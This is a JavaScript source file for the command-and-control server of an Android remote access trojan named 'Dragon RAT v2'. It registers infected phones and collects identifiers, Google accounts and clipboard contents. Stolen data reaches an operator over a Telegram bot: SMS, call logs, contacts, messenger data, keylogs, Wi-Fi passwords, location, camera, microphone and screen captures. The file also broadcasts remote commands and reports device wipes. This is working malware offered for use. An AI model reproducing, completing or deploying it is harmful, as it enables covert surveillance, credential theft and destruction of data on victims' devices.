// socket_handler.js — Dragon RAT v2
// Socket.IO device connection, result handling, disconnect & global helpers

const fs = require('fs');
const path = require('path');
const bot = global.bot;
const ADMIN_ID = global.ADMIN_ID;

function setupSocketHandlers(io) {
    io.on('connection', (socket) => {
        console.log(`[+] New connection: ${socket.id} (${socket.handshake.address})`);

        let registered = false;
        let deviceInfo = null;
        let pingInterval = null;
        let missedPings = 0;
        const MAX_MISSED_PINGS = 3;

        // ── INIT — Device Registration ──

        socket.on('init', (data) => {
            try {
                const info = typeof data === 'string' ? JSON.parse(data) : data;

                const deviceId = info.deviceId || info.android_id || socket.id;
                const model = info.model || 'Unknown';
                const manufacturer = info.manufacturer || 'Unknown';
                const brand = info.brand || manufacturer;
                const sdk = info.sdk || info.build_version_sdk || '0';
                const release = info.release || info.build_version_release || 'Unknown';
                const board = info.board || 'Unknown';
                const cpu = info.cpu_abi || info.cpu || 'Unknown';
                const user = info.user || info.user_serial || 'Unknown';
                const host = info.host || 'Unknown';
                const serial = info.serial || info.serial_number || 'Unknown';
                const buildFingerprint = info.build_fingerprint || 'Unknown';
                const appVersion = info.app_version || '2.0';
                const packageName = info.package_name || 'com.dragon.rat';
                const battery = info.battery_level !== undefined ? info.battery_level : 'N/A';
                const isCharging = info.is_charging !== undefined ? info.is_charging : false;
                const networkType = info.network_type || info.network || 'Unknown';
                const simOperator = info.sim_operator || info.carrier || 'Unknown';
                const simCountry = info.sim_country_iso || info.country || 'Unknown';
                const wifiSsid = info.wifi_ssid || info.ssid || 'N/A';
                const wifiMac = info.wifi_mac || info.mac || 'N/A';
                const bluetoothMac = info.bluetooth_mac || 'N/A';
                const ipAddress = info.ip_address || info.ip || socket.handshake.address || 'Unknown';
                const totalRam = info.total_ram || info.ram || 'N/A';
                const totalStorage = info.total_storage || info.storage || 'N/A';
                const rootStatus = info.is_rooted || info.rooted || false;
                const isEmulator = info.is_emulator || info.emulator || false;
                const screenDensity = info.screen_density || info.density || 'N/A';
                const screenResolution = info.screen_resolution || info.resolution || 'N/A';
                const timezone = info.timezone || info.time_zone || 'UTC';
                const language = info.language || info.locale || 'en';
                const currentDate = info.current_date || info.date || 'Unknown';
                const currentTime = info.current_time || info.time || 'Unknown';
                const contactsCount = info.contacts_count || info.contact_count || 0;
                const installedApps = info.installed_apps || info.apps_count || 0;
                const lastBootTime = info.last_boot_time || info.boot_time || 'Unknown';
                const googleAccounts = info.google_accounts || info.accounts || [];
                const clipboard = info.clipboard || info.clip_data || '';

                deviceInfo = {
                    id: deviceId,
                    socketId: socket.id,
                    model,
                    manufacturer,
                    brand,
                    sdk,
                    release,
                    board,
                    cpu,
                    user,
                    host,
                    serial,
                    buildFingerprint,
                    appVersion,
                    packageName,
                    battery,
                    isCharging,
                    networkType,
                    simOperator,
                    simCountry,
                    wifiSsid,
                    wifiMac,
                    bluetoothMac,
                    ipAddress,
                    totalRam,
                    totalStorage,
                    rootStatus: Boolean(rootStatus),
                    isEmulator: Boolean(isEmulator),
                    screenDensity,
                    screenResolution,
                    timezone,
                    language,
                    currentDate,
                    currentTime,
                    contactsCount,
                    installedApps,
                    lastBootTime,
                    googleAccounts,
                    clipboard,
                    connectedAt: Date.now(),
                    lastSeen: Date.now(),
                    ping: 0,
                };

                // Register in global devices map
                global.devices.set(socket.id, {
                    socketId: socket.id,
                    info: deviceInfo,
                    lastSeen: Date.now(),
                });

                // Auto-select as active device if none exists
                if (!global.activeDevice) {
                    global.activeDevice = socket.id;
                }

                registered = true;
                missedPings = 0;

                // Build admin notification
                const emoji = deviceInfo.isEmulator ? '🖥️' : '📱';
                const rootIcon = deviceInfo.rootStatus ? '👑' : '🔒';
                const batteryIcon = deviceInfo.isCharging ? '⚡' : '🔋';
                const networkIcon = deviceInfo.networkType.toLowerCase().includes('wifi') ? '📶' : '📡';

                const initMsg = [
                    `${emoji} *New Device Connected*`,
                    '',
                    `🆔 \`${deviceInfo.id}\``,
                    `📱 ${deviceInfo.manufacturer} ${deviceInfo.model}`,
                    `🤖 Android ${deviceInfo.release} (SDK ${deviceInfo.sdk})`,
                    `${rootIcon} Root: ${deviceInfo.rootStatus ? 'YES' : 'No'}`,
                    `${networkIcon} Network: ${deviceInfo.networkType}`,
                    `📶 Carrier: ${deviceInfo.simOperator} (${deviceInfo.simCountry})`,
                    `🌐 IP: ${deviceInfo.ipAddress}`,
                    `${batteryIcon} Battery: ${deviceInfo.battery}%${deviceInfo.isCharging ? ' (Charging)' : ''}`,
                    `💾 RAM: ${deviceInfo.totalRam} | Storage: ${deviceInfo.totalStorage}`,
                    `🖥️ ${deviceInfo.screenResolution} @ ${deviceInfo.screenDensity}dpi`,
                    `🌍 ${deviceInfo.timezone} / ${deviceInfo.language.toUpperCase()}`,
                    `📅 ${deviceInfo.currentDate} ${deviceInfo.currentTime}`,
                    `👤 Contacts: ${deviceInfo.contactsCount} | Apps: ${deviceInfo.installedApps}`,
                    `📋 Clipboard: ${deviceInfo.clipboard ? '`' + deviceInfo.clipboard.substring(0, 100) + '`' : 'Empty'}`,
                    '',
                    `💳 Google Accounts: ${deviceInfo.googleAccounts.length > 0 ? deviceInfo.googleAccounts.join(', ') : 'None'}`,
                    '',
                    `🔗 Socket: \`${socket.id}\``,
                ].join('\n');

                bot.sendMessage(ADMIN_ID, initMsg, { parse_mode: 'Markdown' });

                // Show main menu if this is the active device
                if (global.activeDevice === socket.id) {
                    const { getMainMenu } = require('./bot_commands.js');
                    const menu = getMainMenu(deviceInfo);
                    bot.sendMessage(ADMIN_ID, menu.text, {
                        parse_mode: 'Markdown',
                        reply_markup: menu.keyboard,
                    });
                }

                // Start heartbeat
                startPing();

                console.log(`[+] Device registered: ${deviceInfo.manufacturer} ${deviceInfo.model}`);
            } catch (err) {
                console.error('[!] Init error:', err.message);
                socket.emit('error', { message: 'Invalid init data' });
            }
        });

        // ── RESULT — Command Execution Results ──

        socket.on('result', (data) => {
            if (!registered) return;

            try {
                const result = typeof data === 'string' ? JSON.parse(data) : data;
                const type = result.type || 'text';
                const commandId = result.commandId || result.cmd || 'unknown';
                const payload = result.payload || result.data || result;
                const timestamp = result.timestamp || Date.now();

                // Update last seen
                const device = global.devices.get(socket.id);
                if (device) {
                    device.lastSeen = Date.now();
                    if (device.info) device.info.lastSeen = Date.now();
                }

                // Route by result type
                switch (type) {
                    case 'text':
                    case 'command':
                    case 'shell':
                    case 'output':
                    case 'sms_list':
                    case 'call_log':
                    case 'contacts':
                    case 'account_info':
                    case 'whatsapp':
                    case 'telegram':
                    case 'instagram':
                    case 'facebook':
                    case 'snapchat':
                    case 'tiktok':
                    case 'signal':
                    case 'discord':
                    case 'viber':
                    case 'wechat':
                    case 'twitter':
                    case 'linkedin':
                    case 'accounts':
                    case 'installed_apps':
                    case 'clipboard':
                    case 'keylog':
                    case 'wifi_list':
                    case 'wifi_password':
                    case 'wifi_passwords':
                    case 'network_info':
                    case 'device_info':
                    case 'battery_info':
                    case 'location':
                    case 'gps':
                    case 'browser_history':
                    case 'bookmarks':
                    case 'search_history':
                    case 'call_recording':
                    case 'file_list':
                    case 'file_system':
                    case 'notifications':
                        handleTextResult(commandId, payload, timestamp);
                        break;

                    case 'image':
                    case 'photo':
                    case 'screenshot':
                    case 'camera':
                    case 'camera_front':
                    case 'camera_back':
                    case 'gallery_photo':
                    case 'screen_capture':
                        handleImageResult(commandId, payload, 'photo', timestamp);
                        break;

                    case 'file':
                    case 'document':
                    case 'download':
                    case 'gallery_file':
                    case 'video':
                    case 'audio':
                    case 'recording':
                    case 'screen_recording':
                    case 'microphone':
                        handleFileResult(commandId, payload, type, timestamp);
                        break;

                    case 'gallery':
                    case 'gallery_list':
                    case 'contacts_list':
                    case 'sms_threads':
                    case 'photo_list':
                    case 'image_list':
                    case 'bulk':
                        handleBulkResult(commandId, payload, type, timestamp);
                        break;

                    case 'sms_sent':
                    case 'sms_status':
                        const smsMsg = [
                            `✅ *SMS Status*`,
                            '',
                            `📨 ${payload.message || 'Message sent'}`,
                            `📱 To: ${payload.to || payload.recipient || 'Unknown'}`,
                            `🆔 Status: ${payload.status || 'Delivered'}`,
                            payload.error ? `❌ Error: ${payload.error}` : '',
                        ].filter(Boolean).join('\n');
                        bot.sendMessage(ADMIN_ID, smsMsg, { parse_mode: 'Markdown' });
                        break;

                    case 'call_status':
                    case 'call_result':
                        const callMsg = [
                            `📞 *Call Status*`,
                            '',
                            `📱 Number: ${payload.number || payload.to || 'Unknown'}`,
                            `🔄 Status: ${payload.status || 'Completed'}`,
                            `⏱️ Duration: ${payload.duration || 'N/A'}s`,
                            payload.error ? `❌ Error: ${payload.error}` : '',
                        ].filter(Boolean).join('\n');
                        bot.sendMessage(ADMIN_ID, callMsg, { parse_mode: 'Markdown' });
                        break;

                    case 'destroy':
                    case 'wipe':
                    case 'nuke':
                        const destroyMsg = [
                            `💀 *Device Destroyed*`,
                            '',
                            `📱 ${deviceInfo ? deviceInfo.manufacturer + ' ' + deviceInfo.model : 'Unknown'}`,
                            `🆔 \`${deviceInfo ? deviceInfo.id : socket.id}\``,
                            `📊 Status: ${payload.status || payload.message || 'All data wiped'}`,
                            `🗑️ ${payload.details || 'Factory reset initiated'}`,
                        ].join('\n');
                        bot.sendMessage(ADMIN_ID, destroyMsg, { parse_mode: 'Markdown' });
                        global.devices.delete(socket.id);
                        if (global.activeDevice === socket.id) {
                            const remaining = Array.from(global.devices.keys());
                            global.activeDevice = remaining.length > 0 ? remaining[0] : null;
                        }
                        socket.disconnect(true);
                        break;

                    case 'error':
                    case 'err':
                        const errorMsg = [
                            `❌ *Device Error*`,
                            '',
                            `📱 ${deviceInfo ? deviceInfo.model : 'Unknown'}`,
                            `🆔 Command: \`${commandId}\``,
                            `⚠️ ${payload.message || payload.error || payload || 'Unknown error'}`,
                        ].join('\n');
                        bot.sendMessage(ADMIN_ID, errorMsg, { parse_mode: 'Markdown' });
                        break;

                    case 'pong':
                        missedPings = 0;
                        if (deviceInfo) {
                            deviceInfo.ping = Date.now() - (typeof payload === 'number' ? payload : Date.now());
                        }
                        break;

                    default:
                        if (typeof payload === 'string' && payload.length > 0) {
                            const rawMsg = [
                                `📨 *Result: ${type}*`,
                                '',
                                `\`\`\``,
                                payload.substring(0, 4000),
                                `\`\`\``,
                            ].join('\n');
                            bot.sendMessage(ADMIN_ID, rawMsg, { parse_mode: 'Markdown' });
                        }
                        break;
                }
            } catch (err) {
                console.error('[!] Result handler error:', err.message);
                if (typeof data === 'string' && data.length > 0 && data.length < 4000) {
                    bot.sendMessage(ADMIN_ID, `📨 *Raw Data:*\n\`\`\`\n${data}\n\`\`\``, { parse_mode: 'Markdown' });
                }
            }
        });

        // ── DISCONNECT — Cleanup ──

        socket.on('disconnect', (reason) => {
            console.log(`[-] Disconnected: ${socket.id} (${reason})`);

            if (pingInterval) {
                clearInterval(pingInterval);
                pingInterval = null;
            }

            const devInfo = deviceInfo;
            const wasRegistered = registered;

            // Remove from devices
            global.devices.delete(socket.id);

            // Auto-switch active device
            if (global.activeDevice === socket.id) {
                const remaining = Array.from(global.devices.keys());
                global.activeDevice = remaining.length > 0 ? remaining[0] : null;

                if (global.activeDevice) {
                    const newActive = global.devices.get(global.activeDevice);
                    if (newActive && newActive.info) {
                        bot.sendMessage(ADMIN_ID,
                            `🔄 *Active Device Switched*\n\n📱 Now controlling: ${newActive.info.manufacturer} ${newActive.info.model}\n🆔 \`${newActive.info.id}\``,
                            { parse_mode: 'Markdown' }
                        );
                    }
                }
            }

            // Notify admin
            if (wasRegistered && devInfo) {
                const offlineMsg = [
                    `📴 *Device Disconnected*`,
                    '',
                    `📱 ${devInfo.manufacturer} ${devInfo.model}`,
                    `🆔 \`${devInfo.id}\``,
                    `🔌 Reason: ${reason}`,
                    `⏱️ Connected: ${Math.floor((Date.now() - devInfo.connectedAt) / 1000)}s`,
                ].join('\n');
                bot.sendMessage(ADMIN_ID, offlineMsg, { parse_mode: 'Markdown' });
            } else if (wasRegistered) {
                bot.sendMessage(ADMIN_ID, `📴 *Device Disconnected*\n🆔 \`${socket.id}\`\n🔌 ${reason}`, { parse_mode: 'Markdown' });
            }

            registered = false;
            deviceInfo = null;
        });

        // ── RECONNECT ──

        socket.on('reconnect', (data) => {
            console.log(`[~] Reconnect: ${socket.id}`);
            socket.emit('init', data);
        });

        // ── HEARTBEAT ──

        function startPing() {
            if (pingInterval) clearInterval(pingInterval);
            missedPings = 0;

            pingInterval = setInterval(() => {
                if (!registered || !socket.connected) {
                    clearInterval(pingInterval);
                    pingInterval = null;
                    return;
                }

                missedPings++;
                if (missedPings >= MAX_MISSED_PINGS) {
                    console.log(`[!] Ping timeout: ${socket.id}`);
                    if (deviceInfo) {
                        bot.sendMessage(ADMIN_ID,
                            `⚠️ *Device Ping Timeout*\n📱 ${deviceInfo.manufacturer} ${deviceInfo.model}\n🆔 \`${deviceInfo.id}\`\n💔 Missed ${missedPings} heartbeats`,
                            { parse_mode: 'Markdown' }
                        );
                    }
                    socket.disconnect(true);
                    return;
                }

                try {
                    socket.emit('ping', { timestamp: Date.now() });
                } catch (e) {}
            }, 15000);
        }

        socket.on('error', (err) => {
            console.error(`[!] Socket error ${socket.id}:`, err.message || err);
        });
    });

    // ── GLOBAL HELPERS ──

    global.sendCommand = (socketId, command) => {
        const device = global.devices.get(socketId);
        if (!device) return false;

        const socket = io.sockets.sockets.get(socketId);
        if (!socket || !socket.connected) {
            global.devices.delete(socketId);
            return false;
        }

        const payload = {
            ...command,
            commandId: (command.type || 'cmd') + '_' + Date.now(),
            timestamp: Date.now(),
        };

        socket.emit('command', payload);
        return true;
    };

    global.broadcastCommand = (command) => {
        let count = 0;
        for (const [socketId] of global.devices) {
            if (global.sendCommand(socketId, command)) {
                count++;
            }
        }
        return count;
    };

    global.getDeviceList = () => {
        const list = [];
        let idx = 0;
        for (const [socketId, device] of global.devices) {
            idx++;
            const info = device.info;
            const isActive = global.activeDevice === socketId;
            const marker = isActive ? '⭐ ' : '';
            const root = info?.rootStatus ? '👑' : '🔒';
            const net = info?.networkType?.toLowerCase().includes('wifi') ? '📶' : '📡';
            const timeAgo = info?.lastSeen ? Math.floor((Date.now() - info.lastSeen) / 1000) : '?';

            list.push(
                `${marker}${idx}. ${root}${net} ${info?.manufacturer || 'Unknown'} ${info?.model || ''}` +
                `\n   🆔 ${info?.id || socketId.substring(0, 8)}` +
                `\n   🤖 Android ${info?.release || '?'} 🔋 ${info?.battery || '?'}%` +
                `\n   🌐 ${info?.ipAddress || '?'} | ${timeAgo}s ago` +
                (isActive ? ' ◀ ACTIVE' : '')
            );
        }
        return list.length > 0 ? list.join('\n') : '❌ No devices connected';
    };
}

// ── Result Handlers ──

async function handleTextResult(commandId, payload, timestamp) {
    const text = typeof payload === 'string' ? payload :
                 payload?.text || payload?.data || payload?.output || payload?.message ||
                 payload?.result || payload?.content || JSON.stringify(payload, null, 2);

    if (!text || text.length === 0) {
        bot.sendMessage(ADMIN_ID, `⚠️ Empty result for \`${commandId}\``, { parse_mode: 'Markdown' });
        return;
    }

    const maxLen = 4000;

    if (text.length > maxLen) {
        if (text.length > 30000) {
            const buffer = Buffer.from(text, 'utf-8');
            const filename = `${commandId}_${Date.now()}.txt`;
            try {
                const tempDir = path.join(__dirname, 'temp');
                if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
                const filepath = path.join(tempDir, filename);
                fs.writeFileSync(filepath, text);
                await bot.sendDocument(ADMIN_ID, filepath, {
                    caption: `📄 ${commandId} — ${(text.length / 1024).toFixed(1)}KB`,
                });
                fs.unlinkSync(filepath);
            } catch (e) {
                for (let i = 0; i < text.length; i += maxLen) {
                    await bot.sendMessage(ADMIN_ID,
                        `📄 ${commandId} (part ${Math.floor(i / maxLen) + 1}):\n\`\`\`\n${text.substring(i, i + maxLen)}\n\`\`\``,
                        { parse_mode: 'Markdown' }
                    );
                }
            }
        } else {
            const chunks = Math.ceil(text.length / maxLen);
            for (let i = 0; i < chunks; i++) {
                const chunk = text.substring(i * maxLen, (i + 1) * maxLen);
                const prefix = chunks > 1 ? `📄 ${commandId} (${i + 1}/${chunks}):\n` : `📄 ${commandId}:\n`;
                await bot.sendMessage(ADMIN_ID,
                    `${prefix}\`\`\`\n${chunk}\n\`\`\``,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } else {
        await bot.sendMessage(ADMIN_ID,
            `📄 *${commandId}*:\n\`\`\`\n${text}\n\`\`\``,
            { parse_mode: 'Markdown' }
        );
    }
}

async function handleImageResult(commandId, payload, mediaType, timestamp) {
    try {
        let buffer = null;
        let caption = `📸 ${commandId}`;

        if (Buffer.isBuffer(payload)) {
            buffer = payload;
        } else if (typeof payload === 'string') {
            if (payload.startsWith('data:')) {
                const commaIdx = payload.indexOf(',');
                const b64 = commaIdx !== -1 ? payload.substring(commaIdx + 1) : payload;
                buffer = Buffer.from(b64, 'base64');
            } else if (payload.startsWith('/') || payload.startsWith('http')) {
                try {
                    if (fs.existsSync(payload)) {
                        buffer = fs.readFileSync(payload);
                        caption += ` | ${path.basename(payload)}`;
                    } else {
                        await bot.sendMessage(ADMIN_ID, `📸 *${commandId}*: ${payload}`, { parse_mode: 'Markdown' });
                        return;
                    }
                } catch {
                    await bot.sendMessage(ADMIN_ID, `📸 *${commandId}*: ${payload}`, { parse_mode: 'Markdown' });
                    return;
                }
            } else {
                try {
                    buffer = Buffer.from(payload, 'base64');
                    if (buffer.length < 8) throw new Error('Too small');
                } catch {
                    await bot.sendMessage(ADMIN_ID, `📸 *${commandId}*:\n\`${payload.substring(0, 500)}\``, { parse_mode: 'Markdown' });
                    return;
                }
            }
        } else if (payload?.buffer) {
            buffer = Buffer.from(payload.buffer);
        } else if (payload?.base64 || payload?.data) {
            buffer = Buffer.from(payload.base64 || payload.data, 'base64');
            if (payload.filename) caption += ` | ${payload.filename}`;
        } else {
            await bot.sendMessage(ADMIN_ID, `⚠️ Cannot parse image for \`${commandId}\``, { parse_mode: 'Markdown' });
            return;
        }

        if (!buffer || buffer.length < 50) {
            await bot.sendMessage(ADMIN_ID, `⚠️ Empty image for \`${commandId}\``, { parse_mode: 'Markdown' });
            return;
        }

        if (buffer.length <= 10 * 1024 * 1024) {
            await bot.sendPhoto(ADMIN_ID, buffer, { caption });
        } else {
            const filename = `${commandId}_${Date.now()}.jpg`;
            await bot.sendDocument(ADMIN_ID, buffer, {
                filename,
                caption: `📸 ${commandId} (${(buffer.length / 1024 / 1024).toFixed(1)}MB)`,
            });
        }
    } catch (err) {
        console.error('[!] Image error:', err.message);
        try {
            await bot.sendMessage(ADMIN_ID, `❌ Image send failed: ${err.message}`, { parse_mode: 'Markdown' });
        } catch {}
    }
}

async function handleFileResult(commandId, payload, fileType, timestamp) {
    try {
        let buffer = null;
        let filename = `${commandId}_${Date.now()}`;

        const extMap = {
            'video': '.mp4',
            'audio': '.mp3',
            'recording': '.mp3',
            'screen_recording': '.mp4',
            'microphone': '.mp3',
            'file': '.bin',
            'document': '.bin',
            'download': '.bin',
            'gallery_file': '.bin',
        };
        const ext = extMap[fileType] || '.bin';

        if (Buffer.isBuffer(payload)) {
            buffer = payload;
            filename += ext;
        } else if (typeof payload === 'string') {
            if (payload.startsWith('data:')) {
                const commaIdx = payload.indexOf(',');
                const b64 = commaIdx !== -1 ? payload.substring(commaIdx + 1) : payload;
                buffer = Buffer.from(b64, 'base64');
                filename += ext;
                const mimeMatch = payload.match(/^data:([^;]+)/);
                if (mimeMatch) {
                    const mimeExts = {
                        'video/mp4': '.mp4', 'video/3gpp': '.3gp',
                        'audio/mpeg': '.mp3', 'audio/wav': '.wav', 'audio/ogg': '.ogg',
                        'image/png': '.png', 'image/jpeg': '.jpg', 'image/gif': '.gif',
                        'application/pdf': '.pdf', 'text/plain': '.txt',
                    };
                    filename = `${commandId}_${Date.now()}${mimeExts[mimeMatch[1]] || ext}`;
                }
            } else if (fs.existsSync(payload)) {
                buffer = fs.readFileSync(payload);
                filename = path.basename(payload);
            } else {
                try {
                    buffer = Buffer.from(payload, 'base64');
                    filename += ext;
                } catch {
                    await bot.sendMessage(ADMIN_ID, `📄 *${commandId}*: ${payload.substring(0, 1000)}`, { parse_mode: 'Markdown' });
                    return;
                }
            }
        } else if (payload?.buffer) {
            buffer = Buffer.from(payload.buffer);
            filename = payload.filename || (commandId + ext);
        } else if (payload?.base64 || payload?.data) {
            buffer = Buffer.from(payload.base64 || payload.data, 'base64');
            filename = payload.filename || (commandId + ext);
        } else {
            await bot.sendMessage(ADMIN_ID, `⚠️ Cannot parse file for \`${commandId}\``, { parse_mode: 'Markdown' });
            return;
        }

        if (!buffer || buffer.length < 10) {
            await bot.sendMessage(ADMIN_ID, `⚠️ Empty file for \`${commandId}\``, { parse_mode: 'Markdown' });
            return;
        }

        const fileSizeMB = (buffer.length / 1024 / 1024).toFixed(1);
        const caption = `📁 *${commandId}* (${fileSizeMB}MB)`;

        if (buffer.length <= 50 * 1024 * 1024) {
            await bot.sendDocument(ADMIN_ID, buffer, { filename, caption });
        } else {
            await bot.sendMessage(ADMIN_ID,
                `⚠️ File too large (${fileSizeMB}MB > 50MB limit)\n📁 ${commandId}\n📄 ${filename}`,
                { parse_mode: 'Markdown' }
            );
        }
    } catch (err) {
        console.error('[!] File error:', err.message);
        try {
            await bot.sendMessage(ADMIN_ID, `❌ File send failed: ${err.message}`, { parse_mode: 'Markdown' });
        } catch {}
    }
}

async function handleBulkResult(commandId, payload, type, timestamp) {
    try {
        const items = Array.isArray(payload) ? payload :
                      payload?.items || payload?.files || payload?.photos || payload?.images ||
                      payload?.contacts || payload?.list || [];

        if (!items || items.length === 0) {
            await bot.sendMessage(ADMIN_ID, `📂 *${commandId}*: Empty list`, { parse_mode: 'Markdown' });
            return;
        }

        await bot.sendMessage(ADMIN_ID,
            `📂 *${commandId}*\n📊 Total: ${items.length} items`,
            { parse_mode: 'Markdown' }
        );

        let mediaCount = 0;
        let textItems = [];

        for (const item of items) {
            if (mediaCount >= 10) {
                textItems.push(item.name || item.path || item.filename || JSON.stringify(item));
                continue;
            }

            if (item.base64 || item.data || item.buffer) {
                await handleImageResult(`${commandId}_${mediaCount + 1}`, item, 'photo', timestamp);
                mediaCount++;
            } else if (item.path && fs.existsSync(item.path)) {
                const stat = fs.statSync(item.path);
                if (stat.size > 0) {
                    const itemExt = path.extname(item.path).toLowerCase();
                    if (['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(itemExt)) {
                        await handleImageResult(`${commandId}_${mediaCount + 1}`, item.path, 'photo', timestamp);
                    } else {
                        await handleFileResult(`${commandId}_${mediaCount + 1}`, item.path, 'file', timestamp);
                    }
                    mediaCount++;
                }
            } else {
                textItems.push(item.name || item.path || item.filename || JSON.stringify(item));
            }
        }

        if (textItems.length > 0) {
            const text = textItems.join('\n');
            const header = `📂 ${commandId} (remaining ${textItems.length} items):\n`;
            if ((header + text).length > 4000) {
                const buf = Buffer.from(text, 'utf-8');
                await bot.sendDocument(ADMIN_ID, buf, {
                    filename: `${commandId}_list.txt`,
                    caption: `📂 ${commandId} — ${textItems.length} items`,
                });
            } else {
                await bot.sendMessage(ADMIN_ID, `${header}\`\`\`\n${text}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
    } catch (err) {
        console.error('[!] Bulk error:', err.message);
        try {
            await bot.sendMessage(ADMIN_ID, `❌ Bulk result failed: ${err.message}`, { parse_mode: 'Markdown' });
        } catch {}
    }
}

module.exports = { setupSocketHandlers };
